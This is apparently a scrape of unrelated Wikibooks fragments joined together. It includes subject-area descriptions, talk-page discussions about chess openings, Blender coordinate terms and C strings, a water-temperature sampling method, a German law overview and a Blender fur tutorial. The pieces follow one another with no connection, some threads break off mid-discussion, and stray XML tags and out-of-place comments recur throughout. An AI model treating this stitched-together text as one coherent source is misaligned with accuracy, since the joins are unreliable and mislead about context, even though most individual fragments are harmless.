 |description=Books in this subject area deal with '''[[w:algebra|algebra]]''': the study of structures and relationships that arise between numbers and the operations on them.  In addition to working directly with numbers, algebra also studies symbols, variables, or generally elements on a set in relation to operations such as addition and multiplication.  Addition and multiplication and the other operations on numbers are sometimes viewed as more general operations, and their precise definitions lead to structures such as groups, rings, and fields.

 |description=Books in this subject area deal with '''[[w:mathematical analysis|mathematical analysis]]''': the branch of mathematics most explicitly concerned with the notion of a limit, whether the limit of a sequence or the limit of a function. It also includes the theories of differentiation, integration and measure, infinite series, and analytic functions. These theories are often studied in the context of real numbers, complex numbers, and real and complex functions.

== London System ==

Clearly, in the London System, after 3. Bf4 c5 the next move cannot be Bg2 as White has not yet moved his g-pawn. I will replace &quot;4. Bg2 Bf5 5. e3 e6&quot; by &quot;4. e3 e6&quot;, but if someone who knows the L. System better wants to improve this further, feel free.

The movelists here are still messed up.  It looks like a template someone didn't change, or vandalism.  I'm on it!  [[User:Goatasaur|Goatasaur]] ([[User talk:Goatasaur|discuss]] • [[Special:Contributions/Goatasaur|contribs]]) 17:45, 29 April 2011 (UTC)</text>

      <text xml:space="preserve">== Why REALbasic ==
There are a lot of options available for those wanting to learn computer programming. However, we believe that REALbasic is a particularly great way to learn modern programming concepts and techniques.

=== Object-Oriented Programming ===
REALbasic makes learning '''object-oriented programming''' (OOP) simpler than languages like Objective-C or C#. Users have said that learning REALbasic made transitioning to Objective-C almost painless: you learn good OOP techniques as you master REALbasic.

      <comment>/* Normal Coordinates (!?!!?) */</comment>
      <text xml:space="preserve">== Must not, may not, need not? ==
I've written in the original text:
: ''The origin of the the local coordinates is called the center of the object (which must not necessarily be in the center of the object). ''
Someone corrected me and wrote:
: ''The origin of the the local coordinates is called the center of the object (which may not necessarily be in the center of the object).''
Well, what I want to say is, that the object center may be in the center of the object, but it isn't necessarily the case. The object center may be anywhere. So who can put this right? --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 15:54, 18 March 2009 (UTC)

I think it's confusing because it's called object center, and that's not really what it is. &quot;The origin of the local coordinates is called the rotation axis; it can be located anywhere.&quot; would make it clearer to me.
--[[User:Wgoelkel|Wgoelkel]] ([[User talk:Wgoelkel|talk]]) 00:13, 5 April 2009 (UTC)
: No, the rotation axis is something different. The object center is a point (0 dimensions), an axis is a line (1 dimension). So it's just what it is - &quot;the center of the object is the origin of the local coordinates&quot;. Nothing more and nothing less. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 16:00, 5 April 2009 (UTC)

: Good point. How about: &quot;The origin of the the local coordinate system is called the object center. It can be located anywhere, inside or outside of the object.&quot;
:: A little variation: &quot;&quot;The origin of the the local coordinate system is called the object center. It can be located anywhere, e.g. in the gravitational center of the object or even outside the visible mesh.&quot;
:: I find it difficult to describe, because the term object has in Blender several meanings, and you have to be completely aware of the context in which the term is used. A visible object like a cube has at least two parts: 
::#  a data structure that holds the position/rotation/scale of the object 
::# a mesh data block that contains the position of the individual vertices.  
:: Often beginners say &quot;Object&quot; and mean only no. 2, whereas a more advanced user always thinks no. 1 together with no. 2. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 05:39, 6 April 2009 (UTC)

::I've seen where other programs refer to it as a Handle point.  Meaning that if you were to pick up, or manipulate an item, you'd do so with it's handle.  Is there anything tying us down to using a reference to &quot;sometimes non centered center point&quot;?  Now, if that center point is the center of the Bounding box, I could see it being called that, but otherwise, it's simply not a center at all unless you decide to rotate the object with it.  &quot;Object Origin Point&quot; (vs. World (or global) Origin Point, as you mentioned here) seems more informative in an associative definition, and more accurate under all conditions, rather than a single operation.--[[User:Deadguy|Deadguy]] ([[User talk:Deadguy|talk]]) 15:59, 24 August 2009 (UTC)

== Invisible grandparent ==

From the article:
''In Fig. 1b the cup is a child object of the right coordinate cross. The child itself has no local rotation. The right coordinate cross has itself an invisible parent. It is parent and child at the same time. The right coordinate cross is rotated along its global Z axis, the tilt against the world axis is created by the invisible grandparent.''

Isn't the tilt caused by the tilt of the parent, regardless of whatever caused it to tilt?  I think perhaps it should stick to that, perhaps including the suggestion that the parent may also be the child of another parent, whose movements may affect all of it's attached children, and their children.  The concept of introducing invisible grandparents when everything else they run into is likely to refer to parents and children might confuse the issue.

I understood the concept before I read it, and had to look at it for awhile to understand how a third party was at work on the rotation shown, as opposed to a straightforward rotation.  If this were a new concept, I'm not sure I would have followed well enough to understand that the invisible grandparent was more of a &quot;it could be&quot; scenario, and instead would have moved-on thinking I'd try and figure-out the impact of that tidbit later-on if I saw it again.

Great article though.. 
--[[User:Deadguy|Deadguy]] ([[User talk:Deadguy|talk]]) 16:14, 24 August 2009 (UTC)
: You are probably right. Is it sufficient to change the text, or should the image also be altered? If changing the text is enough, would you like to do it? --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 04:34, 25 August 2009 (UTC)


== Surface Normal Description ==
In the section &quot;'''Normal coordinates'''&quot; you say that the normal &quot;''is always perpendicular to the surface''&quot; (which fits with my previous encounters with the term), but later say that for edges &quot;''the normal runs along the edge''&quot;.

This runs counter to my previous 3D experience, and also contradicts the earlier definition. Surely, the normal on an edge is the average of the normals of the faces on either side ? Unless Blender users the term in an odd way.
--[[User:Alun|Alun]] ([[User talk:Alun|talk]]) 10:28, 7 November 2009 (UTC)

:I removed the claim, which seems highly unlikely.  I'm still looking for evidence that Blender uses &quot;normal coordinates&quot; in any context.  I think the key concept here is &quot;normal&quot;, which should be explained in a different module. --[[User:Stepheng3|Stepheng3]] ([[User talk:Stepheng3|talk]]) 14:37, 21 October 2010 (UTC)

== Normal Coordinates (!?!!?) ==

The last section begins &quot;Although Blender is a 3D program, only the faces are visible.&quot;
I'm guessing this is detritus from previous edits. I can't make sense of it, so I'm not sure what concept it is supposed to introduce, so I can't suggest a better wording. Maybe just remove it?

More importantly, is there such a thing as &quot;Normal coordinates&quot;?
The normal is a (calculable) property of the vertex/edge/face, not a distinct entity. Maybe fig.4 should show ''only'' the blue arrows, as the red and green ones aren't relevant to any process in the rendering pipeline [are they?] -- normal is a 1D concept by definition, and only need to be 1D for the various purposes they are used (in the rendering pipeline); showing them as coordinate crosses is somewhat confusing, if not misleading.

Maybe the last section should be entitled &quot;Normals&quot;, if the concept really needs to be introduced here at all(?) -- I suspect this section is/was/tried-to-be about explaining hidden surface removal w.r.t. surface normal direction relative to the viewport plane.  (Quite a few years since I studied 3D CG under Alan Watt, so maybe memory-fade has resulted in me talking utter nonsense here.)
[[User:Zoinks|Zoinks]] ([[User talk:Zoinks|talk]]) 17:34, 26 October 2010 (UTC)

Personnally my problem is with &quot;The normal of a point is the average of normals of the adjacent faces&quot;. My conclusion is that what you meant is : &quot;The normal of a point is the average of normals of the adjacent ''''points'''' &quot;
([[User:Zigomar|Zigomar]] ([[User talk:Zigomar|discuss]] • [[Special:Contributions/Zigomar|contribs]]) 21:25, 20 October 2011 (UTC))

:No, I think the original wording is correct. Finding the normal of a planar face could be done by taking the cross product of two edges. The normal of a point (points have no direction) would actually refer to any vector (all vectors are perpendicular to zero vector). When specifying the normal to a point for something like http://en.wikipedia.org/wiki/Gouraud_shading, you'd take the average of all adjacent faces. The vertex in this case is supposed to represent a point on a curved ''surface'', which would have an exact normal vector if represented mathematically, but the digital representation means it can only be approximated by looking at surrounding faces. That's my beginner's understanding, anyway. I don't know what's meant by &quot;Although Blender is a 3D program, only the faces are visible.&quot; , though.</text>

      <text xml:space="preserve">==Hi all==
Hi all.  My hope here is to have a wiki that will delve in to some of the opening lines with some explanation.  I think this is different from the &quot;Basic Openings&quot; module -- I think it is at least an intermediate topic.  While some sites exist that have &quot;opening explorers,&quot; none are wikis.

I would hope that at each half move, experienced chess players could annotate the description and provide some insight into the postion -- perhaps leading readers to the idea of themes rather than memorization of moves.  I would especially like to see annotations at those points in the lines where classic chess opening tomes simply stop and say something like &quot;giving black good chances.&quot;  Instead, it would be nice if there was a lively discussion about the line going forward.  Some of the refuted lines aren't even discussed in the opening tomes -- even though their refutation is anything but obvious to the amateur.  A good example of this is the [[Opening theory in chess/1. e4/1...e5/2. Nf3/2...Nc6/3. Bc4/3...f5|Rousseau Gambit]].

Finally, it is not my intention to replace the great opening articles on Wikipedia.  Again, I'd like to see kibitzing at the various points in the opening lines.

[[User:ThreeE|ThreeE]] 22:58, 20 August 2005 (UTC)

hi there. Chi Sigma here, from Britain, rated 146 ECF (1980 ELO), sporadic Wikipedian. You're right, it would be great to create an opening explorer in wiki form, and I found this place while searching for help on how I'd go about doing exactly that. I think this could (should) be a big thing. I'll do what I can. [[User:Chi Sigma|Chi Sigma]] 13:14, 27 September 2005 (UTC)

== Important notice ==

The Chess wikibook had separate chapters called Basic Openings and Opening Theory. The Opening Theory module covered the same broad subject as Basic Openings but using a significantly different approach. While Basic Openings was a linear chapter, Opening Theory aimed to be an opening explorer along the lines of this web site [http://www.eudesign.com/chessops]. In addition, Basic Openings was... basic, while Opening Theory had a theoretically unlimited depth.

'''I have made the former Opening Theory chapter of the Chess wikibook into a separate wikibook, called 'Opening theory in chess'.'''

My reasons for doing this centre on the fact that the Chess wikibook is meant to a) reach 100% completion eventually and b) be something that a reader can get through from cover to cover and which will provide a working knowledge of the basics of chess. The Opening Theory chapter was inconsistent with this because:

*Opening theory ''dwarfs'' the rest of chess literature. One needs only to look at the typical bookstall at a chess tournament to see this. It would take a long time and a lot of effort to create the definitive guide to chess openings, which would retard the completion of the Chess wikibook as a whole. Indeed, Chess is nearing completion, while Opening theory in chess is close to 0%.
*The Opening Theory chapter was intended to be open-ended and constantly evolving in breadth and depth, like the Cookbook, with the result that Chess could ''never'' be 100% complete. Better, to my mind, to have one complete and readable book with a link to another constantly evolving one 'for further information'. 
*The concepts behind opening theory get complicated and potentially off-putting to someone who simply wants to know a bit about chess.

I believe this complies with Wikibooks' no-forking policy because:
*The approaches used by the two books are completely different
*The content itself differs in scope and depth
*The minimal actual duplication of material is for the greater good of Wikibooks as I have explained above.

[[User:Chi Sigma|Chi Sigma]] 10:16, 8 October 2005 (UTC)
:Thank you for putting this notice both in the Chess Wikibook as well as on this discussion page.  My first impression was that it should be included in the Chess Wikibook instead, but I see what you are suggesting.  My only concern is that this Wikibook doesn't seem to flow like a &quot;book&quot;, at least to introduce some opening moves one at a time, but rather is more of an index into a bunch of &quot;articles&quot; about opening moves in Chess.  Such an index is necessary, but I'm not sure if it there could be some more organization with this Wikibook?

:You are correct that the content of this Wikibook could completely overwhelm a general introduction to Chess, as the Chess wikibook can and ought to be.  Good luck with this project, and I hope that it continues to progress.  --[[User:Robert Horning|Rob Horning]] 08:18, 15 October 2005 (UTC)

== More Progress Needed ==

More needs to be done with this wikibook. This would be a great asset to anyone interested in openings out there. Here is a website that has it's own opening explorer with some statistics like the most played and % wins for white and black and percentage for a draw. www.chessgames.com
There is also kibitzing on the site which is very useful for some more info. They also have pages on just particular openings which also have kibitzing. Check it out, I would like to see this wikibook become much more extensive in the coming months. [[User:128.6.175.75|128.6.175.75]] 20:23, 19 January 2006 (UTC)
:Hi, I'm new to wikibooks but have been editing on wikipedia for about a year. I've been studying chess more than 10 years though I'm not as active in the tournament scene. Anyway, I'm going to flesh out a number of lines--at least to give pages for such basic openings as the Queen's Gambit (until now, there were no pages in this wikibook covering the declined or accepted lines). For now I'm just cutting and pasting the basic page and editing to put links to wikipedia for named lines (such as Tarrasch Defense etc.). For now I'm not as interested in getting in-depth as I am at least giving the barest overview of the main lines; at the least, there should at least be red links listed for the main lines so people at least have the barest clue what the main options are.--[[User:JECompton|JECompton]] 01:46, 22 June 2006 (UTC)

== A few Questions on Making Pages in This Book ==

One first question: when should a named line link to wikipedia, and when should it link back into this wikibook?--[[User:JECompton|JECompton]] 01:46, 22 June 2006 (UTC)
::At one point I added many links to wikipedia but then I got taken to task for it. Basically WikiBooks is suppose to be self contained books, so links to wikipedia are discouraged. You can read more here [[Help:Wikibooks for Wikipedians]]. [[User:SunCreator|SunCreator]] ([[User talk:SunCreator|talk]]) 21:26, 25 June 2008 (UTC)

A second: When should I put slashes at the end of moves? I notice some of the existing pages have them while others don't. It makes for some confusion with making the links, though I think the confusion is mine--as long as I understand the form here, I'll be happy.--[[User:JECompton|JECompton]] 03:41, 22 June 2006 (UTC)
:Nevermind. By looking around the 1.e4 pages, I see that my broken link must have had a different problem, and as long as I follow the 1.e4 pages format, I'll be fine.--[[User:JECompton|JECompton]] 04:04, 22 June 2006 (UTC)

3rd q: at the top of this module, it says one can navigate by ECO code. I don't see this anywhere. How is this implemented?--[[User:216.184.15.227|216.184.15.227]] 15:47, 22 June 2006 (UTC)

== Opening Ideas ==

how about describing the main ideas of each opening, instead of just collecting theory?  This would make it more a sort of textbook - has this been the intention? [[User:FairPhyllis|FairPhyllis]] 20:17, 4 November 2006 (UTC)

== Suggestion. ==

I would like to suggest if the ‘Chess’ Wikibook could be separated into three distinct levels, beginner, intermediate and advanced.
This will allow for more abstract techniques to be included in a series of coherent chess text books.
‘Opening theory in chess’ could be included into intermediate and all levels could have a portal to allow accessibility. --[[User:Herraotic|Herraotic]] 20:48, 7 December 2006 (UTC)

I don't know that I agree with this.  Certain concepts are more advanced, but this sounds more like the framework of another wiki book on chess tactics and strategy which still is no easy task.  I still would prefer an additional book of this nature.  Even some better players would benefit from this as well as beginners.

== About notation... ==

Do you note castling by 0-0 or O-O ???

Do you use the e.p. notation after a pawn captures en passant ???

Do you include moves evaluations like !, ?, !?, ?!, !! and ??

What are the positions evaluation we should use ? I've been using : +/- -/+ =/+ +/=, are there other ? How are they ordered ?

[[User:Horyon|horyon]] 13:14, 26 December 2006 (UTC)

Castling is O-O as in PGN. There are no ! and ?s in the page names, nor indications of check/checkmate, nor e.p. though these may be included in the main text and hyperlinks.

Position evaluations are optional. Stick with the Informator symbols: +- +/- +/= = =/+ -/+ -+ in that order. [[User:Chi Sigma|Chi Sigma]] 12:12, 11 July 2007 (UTC)

:Castling is written as O-O and O-O-O, for kingside and queenside castling respectively. Try to avoid !, ?, !? etc.

: And evaluation of unclear? use &amp;infin; or ~ (seen this ~ used on wikipedia) or not use at all? [[User:E5ricky|E5ricky]] 22:17, 24 October 2007 (UTC)

== Links to this wikibook in the wikipedia ==

I've remarqued that a few pages about chess in the wikipedia have links toward this wikibook, but often these links are incorrect (I've often seen 1.e4 instead of 1. e4 and Chess/Opening theory instead of Opening theory in chess). So maybe we should try to :
# check all the links and correct them when needed
# add links in all other pages about chess openings

This would increase the popularity of this wikibook.

The question is : should we only include a general link to this wikibook or should we link every move in a wikipedia page to the corresponding page in the wikibook ?

[[User:Horyon|horyon]] 02:04, 6 January 2007 (UTC)

It's all my fault, I'm afraid. I carved out Opening Theory into a separate wikibook, for reasons I've explained elsewhere on this page, and introduced a new scheme for naming pages to fix a specific technical problem.

The plan: Over a couple of weeks, I move all the existing pages to their new addresses, and then redirect all the links from Wikipedia. 

What actually happened: Just when I'd made all the changes, I lost internet access for a long time. Thus leaving the Wikibook pretty well bollocksed up.

My apologies to everyone whose enjoyment of Wikibooks has suffered.

I intend to fix all the broken links some time soon, and then see if I can make some sort of dent in the enormous job of writing the content.

In answer to horyon: For sure, we should link from Wikipedia to the exact page in this Wikibook - it's added functionality at almost no cost in effort, no? [[User:Chi Sigma|Chi Sigma]] 22:30, 15 February 2007 (UTC)

== Progress ==

Hi all.  It's been about 2 years since I have had a chance to revisit this work.  I am impressed by some of the progress various authors have made.  I hope to be able to indulge my chess affection some again soon and hope to begin contributing again.[[User:ThreeE|ThreeE]] 02:00, 4 August 2007 (UTC)



== Theory Table on Initial position ==

This table looks poor (just a long list(space padded) of first move and I don't think a theory table is going to be suitable on this page. Maybe extend the quick menu or something similiar. [[User:E5ricky|E5ricky]] 23:46, 20 October 2007 (UTC)

Not sure if this is really the place to ask, but is there a page for the Catalan?  I couldn't find it under the list on the d4 page.  Sorry to bother if there isn't. :|  [[Special:Contributions/207.30.253.250|207.30.253.250]] ([[User talk:207.30.253.250|talk]]) 20:31, 3 March 2008 (UTC)

This would be a better part of the book (chapter/section/example)if it were complete in itself.
Not to seem ungrateful but how about the iris and the pupil?
And, of course, it should be put back together as a finished eyeball for the &quot;Noob&quot;?  
Even though those processes may (or may not) have been addressed elsewhere.

===Overview===

Water temperature is a measure of how warm or cool a body of water is. This plays an important role in the functioning of aquatic ecosystem and influences a wide range of other chemical and physical parameters.  Higher water temperatures decrease the ability of water to hold oxygen, reduce the density of the water (how heavy it is) and may also have a controlling impact on events such as algae blooms. Temperature readings are also used to improve the interpretation of other measured parameters. Higher water temperatures influence the ability of water to hold oxygen, and may influence salinity readings ([[Methods_Manual_for_Salt_Lake_Studies/Salinity]]).  

Factors that influence water temperature include the time of day, season, depth of water and the presence of stratified salinity layers. In some saline lakes the denser underlying layers of brine may trap heat, resulting in a higher water temperature in the deeper layers than in layers of water closer to the surface. Where such 'thermoclines' are recorded, they can indicate the presence of previously unsuspected salinity layers (haloclines).

===Equipment types===

There are several types of equipment used to measure water temperature. The most common are glass thermometers or electronic temperature meters. A glass thermometer is the cheapest method. An accurate electronic temperature meter is quite expensive in comparison. Accurate electronic temperature sensors are also commonly found in multi-sensor CTP meters, where conductivity, temperature and pH are measured together. 

===Sampling temperature===

Red spirit thermometer or temperature meter

Sampling dipper or collection bottle attached to a pole for sampling

Record form and pencil


===To ensure good results===

The thermometer or meter should be calibrated yearly against a certified thermometer. 

Glass spirit thermometers should be checked prior to every use for bubbles in the red spirit or cracks in the glass housing. 

If bubbles or gaps are found in the red spirit, the thermometer should be ‘shaken down’ until the bubbles or gaps disappear. If cracks are found in the glass housing the thermometer should be replaced.

When you collect the water sample, make sure it is at least a metre out from the shore (preferably further out) and from at least 20 cm below the surface. 

Place the thermometer or the meter's probes into the water sample as soon as it is collected and leave in the water until the reading stabilises (this may take up to 2 minutes). 

Record the reading 

If the water is deep, you may like to take several samples from different depths to construct a graph of the temperature variation with depth.

      <comment>no mention of &quot;the old nightmare&quot;</comment>
      <text xml:space="preserve">== Harry's &quot;old nightmare&quot; ==

A couple of times, we've had an editor say that &quot;Harry's old nightmare&quot;, mentioned in this chapter, was &quot;- actually its the laugh and his parents vanishing in a flash of green light after he looks in the mirror of erised&quot;. There is no mention that Harry had ever had nightmares about flashes of green light, and Harry's parents did not vanish in the Mirror Erised; how could they, after all, if the mirror shows &quot;only your heart's desire&quot;? In fact, no recurring nightmares are mentioned in the book at all; it's only with ''Order of the Phoenix'' that we start seeing a recurring nightmare, and there it isn't really his nightmare at all, but Voldemort's.

      <text xml:space="preserve">German law is the law of Germany. Germany's law system has considerably changed in the years after the first World War. Beforehand it was a monarchy with an emperor and a kind of parliament called &quot;Bundesrat&quot; (federal council). Do not confuse it with the nowadays &quot;Bundesrat&quot;! Then, in 1918/1919 Germany became a democratic republic. It got a quite liberal constitution (&quot;Deutsche Verfassung von 1919&quot; or -- mostly -- &quot;Weimarer Reichsverfassung&quot;). However, when Hitler became Chancellor he used the democratic system to erode it itself. The democratic republic changed to a dictatorship resulting in the second World War. 1945 WWII ended and the Allies intervened and took action in the legal system of Germany: They abolished laws from the Nazis which was not appropriate, mostly because it was racist. Then there was established the Parliamentary Council (&quot;Parlamentarischer Rat&quot;). It was constituted to form a new constitution. This happened in 1949 with the announcement of the &quot;Grundgesetz für die Bundesrepublik Deutschland&quot; (abbr.: GG; Basic Law for the Federal Republic of Germany). So, Germany is a democratic and federal social state (Art. 20 GG). It is also governed by the rule of law but that is not stated literally in the constitution. It is deduced from the way of law-making, the separation of powers, the basic rights and a lot more.

The law system in Germany is -- in contrast to the English legal system -- an inductive system. That means that law does not derive from decisions of judges but from the parliament. Although that is the main source of law today in the English legal system as well, there are differences. Judges in Germany are not allowed not to apply laws from the parliament -- even when they think it is not just. They can only ask the Federal Constitutional Court of Germany to declare it unconstitutional.

I renamed the variables in &quot;ststr&quot; as recommended at [http://communitywiki.org/PlainTalk CommunityWiki: PlainTalk].
This is a functionally-identical refactoring.
Since compilers will produce identical code no matter what you name the variables, we might as well use human-understandable variable names like &quot;haystack&quot;, &quot;needle&quot;, &quot;source&quot;, &quot;dest&quot; rather than &quot;s1&quot; or &quot;s2&quot;.

== wchar_t ==

Is not &quot;16 bit (at least)&quot;, wchar_t should be able to handle at least char values. But wchar_t often wider, than just char, and has 16/32 bit width.

And about encodings: it's necessary to say that wchar_t is only INTERNAL representation for wide strings and has no deal with external encoding in system. How to get wchar_t from outer world and how to print wide characters depends on selected locale and conversion between internal representation and external encoding done automatically by wide character I/O functions such as wprintf, wscanf etc. The only conditions is that external locale should be loaded properly by setlocale (LC_ALL, &quot;&quot;); and, of course, input should be in that locale.</text>

''There is an older version of this page created with [[Blender 3D: Noob to Pro/Furry 2.40|Blender v2.40]].''

(NOTE:  '''New:''' marks 
{{B3D:N2P/ForVersion|2.69}} Notes added for newer versions.  I'm not an expert but they seem to work.)

[[File:Blender3D FurWithParticles-Finished-2.48a.jpg|thumb|300px|'''Figure 1:''' The result of this tutorial: some furry thing]]

This tutorial deals with fur, i.e. lots of relatively short hairs covering a body. We will use particles to create the fur, and discuss a few aspects here:
* How to determine the length and the thickness of the hair.
* How to determine the place to grow the hair.
* How to color hair.
* How to render efficiently. 

The particle system is far too complex to show more than one method in this tutorial. You can achieve many of the same effects shown here in different ways.

{{clr}}
== The emitter ==
[[File:Blender3D AddAParticleSystem-2.48a.png|framed|'''Figure 2a:''' Adding a particle system.]]
* Remove the cube.
* Add an ''UVSphere''. This will become our emitter. 
* Change to the ''Particle'' buttons in the ''Object'' buttons ('''Fig.&amp;nbsp;2a'''). '''New:'''  looks like [[File:Blender255ParticlesContextButton.png|20 px]] in newer versions.
* Click on ''Add New''. '''New''':  Click on 	[[File:Blender268CirclePlusIcon.png|20 px]] in newer versions.
* Rename the particle system to &quot;Fur&quot;.
* Change the particle system type to ''Hair''.
A ''Hair'' particle system has a lot of specialties, the most important thing is that we can edit the particle &quot;motion&quot; by hand if we want to. Apart from that normal particle physics apply, so everything a particle does hair can do also and vice versa. A particle hair shows the way of the particle during it's lifetime at once. To do that efficiently not every single frame is rendered as a point, but a certain number of control points are calculated. Between these control points there will be drawn an interpolated path. The number of control points is the number of segments + 1. 

{{clr}}
[[File:Blender3D ParticleSystemForFur-2.48a.png|framed|'''Figure 2b:''' Particle system settings]]
For fur you need lot's of particles, like 1.000.000 upwards. This will hurt us badly if we have to deal with so many particles in the 3D window and want to render it. Therefore we will create the great amount of particles with so called &quot;children&quot;, that mimic the behavior of their parents. The amount of particle parents should be as low as possible, but you need a certain amount to control the distribution of the hair. We will also use as little control points as possible, three segments should be enough for short fur.
* Set the ''Amount'' to 1000.
* Set the number of ''Segments'' to three. '''New''' I can't find this in 2.69.
* ''Emit from:'' '''New'''  I can't find this in 2.69
** ''Random'':''Faces''
** ''Even''  :''Random''

This will create a nice, uniform distribution. 

Let the hair grow - the hair shows the path of the particle: 
* Set ''Normal'' to 0.05. '''New:'''  Hair Length under Emission.
* ''Random'' 0.005
Nothing special here: the hair grows in the direction of the face normals. Length and direction are a bit randomized.

The ''Visualization'' type changes automatically to type ''Path'' if you select a hair particle system. If you would render now, you couldn't see the emitter object any more. 
* Activate ''Emitter'' in the ''Visualization'' panel. '''New:''' In the Render panel.
* Activate ''Strand Render''. '''New:''' In the Render panel.
The ''Strand Render'' (which I have baptized ''keypoint strands'' to differentiate from the &quot;normal&quot; ''polygon strands'') renders the hair strands extremely efficiently and magnitudes faster than the normal strand. It is the only way to handle many hairs in terms of memory consumption. But it has a few disadvantages:
:- They are not seen by raytracing, so you don't get raytracing reflections and no raytracing shadows. You can use environment mapping to compute the reflections and ''Spot Lamps'' with buffer shadows for the shadow.
:- If the hair is very thick (like 1 BU) sometimes the shape is not correct.

* Activate ''Children from Faces''. '''New:''' I chose Simple under children.
* ''Amount:'' 5 This is the amount of children particles for each parent. 
* ''Render Amount:'' 50 This is the amount of particles during the render. 
* ''Rough 2:'' 0.1 '''New:''' I used ''Roughness &gt; Random'' for this setting.   Random variation of the shape of the particles. So the hairs will not stand plain upright and appear a bit curly. 
The parent particles are not rendered by default, so now we have 5.000 Particles that render on my old machine in 6 seconds. If we use 1.000 children we have 1.000.000 particles, that need approx. 1 GB of RAM and render in 1:42 minutes. If you render ''keypoint strands'' with ''Children from Faces'' you can also use ''Child simplification'', which will reduce the amount of particles on objects far away from the camera automatically. '''New:''' Don't see this.  

{{clr}}
[[File:Blender3D FurWithParticles-NoMaterial-2.48a.jpg|thumb|300px|'''Figure 2c:''' The first render without material.]]
Now we should change the lighting to get a preview.
* Select the lamp.
* Change to the ''Lamp'' buttons.
* Change the lamp type to ''Spot''.
* Change the shadow type to ''Buf. Shadow''
* Change the buffered shadow type to ''Classic-Halfway''. 
This is a great shadow type that renders keypoint strands very well and creates fewer artifacts than ''Classical'' (In my opinion). 
I have inserted two other lamps and used a classical three point lighting for the first rendering ('''Fig.&amp;nbsp;2c'''). 


[[File:Fur settings.png|thumb|200 px|left|Click on image to see larger version.]]
'''NEW:'''
{{B3D:N2P/ForVersion|2.69}}
Here are the settings I used and the render result I got.  (Click to enlarge the image and read the settings.)

{{clr}}

== Material ==
In the material buttons you can set different aspects for the strands:
:- their width and form
:- the used shader
:- the base color 
:- a texture along the strand
:- different particle attributes like length, density or roughness

* Add a material to the emitter.
* Name the material &quot;Fur&quot;. 

=== Strands Shader ===
[[File:Blender3D StrandsShaderSettings.png|framed|'''Figure 3a:''' ''Strands'' settings in the material buttons.]]
The default strands settings for ''Keypoint strands'' are shown in '''Fig.&amp;nbsp;3a'''. Take a look in the [http://wiki.blender.org/index.php/Doc:Manual/Materials/Properties/Strands Manual about Strands] for an explanation of all settings. 

* Change the ''End'' value to 0.25, this will make the hair more spiky (not shown in '''Fig.&amp;nbsp;3a'''). 
{{B3D:N2P/Note|''Surface Diffuse:'' It might be easier to achieve a good lighting environment if you check ''Surface Diffuse.'' With ''Surface Diffuse'' turned on, hair does not show as many highlights, which may be too bright without it. I've seen many great examples of fur that use this parameter. However, you have to decide right at the beginning whether you want to use it because it affects all the other material settings. This is something you have to decide for yourself.}}


{{clr}}

=== Giving the hair its base color ===
[[File:Blender3D FurTexture for FurTutorial.png|thumb|200px|'''Figure 3b:''' Fur color texture]]
Strands are rendered with the material of the underlying face/vertex, including shading with an UV-Texture. Since you can assign more than one material to each face, each particle system may have its own material and the material of the underlying face can be different from the material of the strands. We will use an UV texture and use it for the surface of the emitter as well as for the color of the hair.

* Change to ''Front'' view in the 3D window (''View-&gt;Front'').
* Make sure you are in ''Orthographic'' view mode (also in the ''View'' menu).
* Change to ''Edit'' mode of the sphere.
* Press '''U''' to unwrap, select ''Sphere from View''. This is a quick and well working method to correctly unwrap a sphere the easy way. 
You don't need to assign a texture in the ''UV/Image Editor'', we only need the coordinates now.

[[File:Blender3D FurWithParticles-ColorTexture-2.48a.jpg|thumb|300px|'''Figure 3c:''' Emitter with color texture.]]
* Add a texture to the material, name it &quot;FurColor&quot;.
* Set ''Map Input'' to ''UV''.
* Go to the ''Texture Buttons'' and set ''Texture-Type: Image''.
* Load an image texture. I have used the image in '''Fig.&amp;nbsp;3b'''.
Normally I would just stop here, I think the material is good enough. But if you want to make the fur more fluffy and soft, you should a second texture along the strand, which changes the alpha value. 

{{clr}}
[[File:Blender3D StrandFadeSettings.png|thumb|400px|'''Figure 3d:''' Settings for a texture along the strand.]]
If you want to do that:
* Activate ''ZTransp''.
* Add a second texture.
* ''Map Input:'' ''Strand''
* ''Map To:'' ''Alpha'' and ''Spec'', ''DVar''=0
* Use a blend texture (''Linear'' or ''Quad'')
You can change all other properties this way, for example the color along the strand (bleached tips).

{{clr}}

== Changing Hair length with a texture ==
At first I will show you how to render the emitter mesh with a different material than the strands. Then I will show how to change the length of the hair with a texture semi-interactively.
* Change to the ''Editing'' Buttons.
* Change to ''Edit'' mode.
* In the ''Links and Materials'' panel click on ''New'' in the material section (see '''Figure 4a''').[[File:Blender3D FurWithParticles-ButtonToClick-2.49a.png|thumb|300px|'''Figure 4a:''' Button to click]]
* Make sure all vertices are selected.
* Click on ''Assign''. 
* Change back to ''Object'' mode.
Now the emitter bears a second material.
* Return to the material buttons. 
* In the ''Links and Pipeline'' panel click on the '''X''' next to the material name (''Deletes link to this Datablock'').
* Add a new material.
* Name it ''Emitter''.

Now you have a new material on your emitter object. Since the particle system uses material no.&amp;nbsp;1 you can use different settings for the emitter.

[[File:Blender3D FurWithParticles-TexturePainting-2.48a.png|thumb|300px|'''Figure 4b:''' Texture painting]]
We have already unwrapped the emitter, this is something that will probably be the case also for any real models. Now we will use an UV-Image and texture painting to determine the hair length.
* Split the 3D window.
* Change the right hand side to an ''UV/Image-Editor'' window. 
* Change to edit mode of the emitter object.
* In the ''UV/Image-Editor'' use ''Image-&gt;New...'' and confirm the default settings. This will create a new image, that we will paint on.
* Click on the package icon in the windows header of the ''UV/Image-Editor'' window. Confirm.
* Change the object to ''Texture Paint'' mode.  '''Noob Note:''' ''In the 3D Window, click on the drop down menu.  Change it to '''''Texture Paint'''.
Now you see the texture on the object. 
* Paint a structure on the object. 
* Change back to object mode.
* Go to the ''Material'' buttons.
* Change the active material to ''Fur'' (click on the arrows in the ''Links and Pipeline'' buttons where it reads ''2 Mat 2'').

[[File:Blender3D FurWithParticles-ParticleLengthSettings-2.48a.png|framed|'''Figure 4c:''' Material settings for setting the particle length with a texture.]]
* Create another texture. Name it ''FurLength''.
* Set ''Map Input'' to ''UV''.
* Set ''Map To''
** Turn ''Col'' off.
** ''PAttr''
** ''Length''
** ''DVar=0'' All the white areas on the texture will produce a particle length of 0.
* Load the image texture that we have painted.
{{clr}}
